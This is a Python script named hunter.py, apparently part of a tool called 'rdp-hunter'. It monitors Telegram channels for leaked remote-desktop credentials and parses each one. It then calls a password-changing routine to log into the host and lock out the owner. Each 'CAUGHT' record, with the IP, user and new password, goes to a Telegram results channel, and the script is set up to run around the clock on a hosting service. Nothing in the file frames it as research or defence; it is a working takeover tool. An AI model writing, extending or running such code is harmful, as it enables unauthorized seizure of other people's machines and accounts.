import sys
print("[STARTUP] hunter.py loading...", flush=True)
import os
import asyncio
import json
from datetime import datetime
from telethon import TelegramClient, events
from telethon.tl.types import PeerChannel
from telethon.sessions import StringSession
from config import (
    API_ID, API_HASH, CHANNEL_USERNAMES, SESSION_NAME,
    SAVED_MESSAGES, PHONE_NUMBER, STRING_SESSION, BOT_TOKEN, get_channels, MAX_CONCURRENT
)
from changer import parse_credentials, process_rdp, generate_password

print("[STARTUP] Imports done, starting main...", flush=True)


async def send_to_saved(client, text):
    try:
        await client.send_message(SAVED_MESSAGES, text)
        print(f"[DEBUG] Message sent to {SAVED_MESSAGES}", flush=True)
    except Exception as e:
        print(f"❌ SEND ERROR to {SAVED_MESSAGES}: {e}", flush=True)
        import traceback
        traceback.print_exc()


def run_health_server(port):
    """Simple health check server in background thread"""
    from http.server import HTTPServer, BaseHTTPRequestHandler
    import threading
    
    class HealthHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path == '/health':
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b'OK')
            else:
                self.send_response(404)
                self.end_headers()
        def log_message(self, format, *args):
            pass
    
    server = HTTPServer(('0.0.0.0', port), HealthHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


def format_result(record):
    if record["status"] == "success":
        return (
            f"✅ **CAUGHT**\n"
            f"🌐 IP: `{record['ip']}`\n"
            f"👤 User: `{record['domain']}\\{record['username']}`\n"
            f"🔑 New Pass: `{record['new_password']}`\n"
            f"⏰ Time: {record['timestamp']}"
        )
    else:
        return (
            f"❌ **FAILED**\n"
            f"🌐 IP: `{record['ip']}`\n"
            f"👤 User: `{record['domain']}\\{record['username']}`\n"
            f"⚠️ Error: {record['error']}\n"
            f"⏰ Time: {record['timestamp']}"
        )


async def main():
    # Bot token still needs API_ID/API_HASH for Telethon connection
    if not BOT_TOKEN and (API_ID == 0 or not API_HASH):
        print("❌ Config missing: set API_ID, API_HASH, CHANNEL_USERNAMES env vars")
        return
    
    channels = get_channels()
    if not channels:
        print("❌ No channels configured. Set CHANNEL_USERNAMES env var (comma-separated)")
        return
    
    # Priority: BOT_TOKEN > STRING_SESSION > file session
    if BOT_TOKEN:
        client = TelegramClient(SESSION_NAME, API_ID, API_HASH)
        print("[*] Using Bot Token")
    elif STRING_SESSION:
        session = StringSession(STRING_SESSION)
        client = TelegramClient(session, API_ID, API_HASH)
        print("[*] Using StringSession")
    else:
        client = TelegramClient(SESSION_NAME, API_ID, API_HASH)
        print("[*] Using file session")
    
    # Limit concurrent SMB connections
    smb_semaphore = asyncio.Semaphore(MAX_CONCURRENT)
    
    @client.on(events.NewMessage(chats=channels))
    async def handler(event):
        text = event.raw_text
        parsed = parse_credentials(text)
        if not parsed:
            return
        
        ip, domain, username, old_pass = parsed
        chat = await event.get_chat()
        chat_name = getattr(chat, 'username', getattr(chat, 'title', str(event.chat_id)))
        print(f"[+] Detected from {chat_name}: {ip} {domain}\\{username}")
        
        async with smb_semaphore:
            success, msg, record = process_rdp(ip, domain, username, old_pass)
        print(f"[+] Result: {msg}")
        
        if record:
            await send_to_saved(client, format_result(record))
    
    print("[*] rdp-hunter starting...", flush=True)
    print(f"[*] Monitoring {len(channels)} channel(s): {', '.join(channels)}", flush=True)
    
    # Start simple health check server for Railway
    port = int(os.getenv('PORT', '8080'))
    health_server = run_health_server(port)
    print(f"[*] Health check server on port {port}", flush=True)
    
    try:
        if BOT_TOKEN:
            print("[*] Starting bot...", flush=True)
            await client.start(bot_token=BOT_TOKEN)
            print("[*] Bot connected successfully", flush=True)
        elif STRING_SESSION:
            await client.connect()
            if not await client.is_user_authorized():
                print("❌ StringSession invalid/expired", flush=True)
                return
        elif PHONE_NUMBER:
            await client.start(phone=PHONE_NUMBER)
        else:
            await client.start()
        
        print("[*] Connected. Running 24/7...", flush=True)
        
        # Test results channel
        print("[*] Testing results channel...", flush=True)
        test_msg = (
            "🧪 **RDP Hunter Test**\n"
            f"✅ Bot started: {datetime.utcnow().isoformat()}Z\n"
            f"📡 Monitoring: {', '.join(channels)}\n"
            "🤖 Ready to catch RDPs!"
        )
        await send_to_saved(client, test_msg)
        print("[*] Test message sent to results channel", flush=True)
        
        await client.run_until_disconnected()
    except Exception as e:
        print(f"❌ STARTUP ERROR: {e}", flush=True)
        import traceback
        traceback.print_exc()
        # Keep health check alive so Railway doesn't restart loop
        while True:
            await asyncio.sleep(60)


if __name__ == "__main__":
    asyncio.run(main())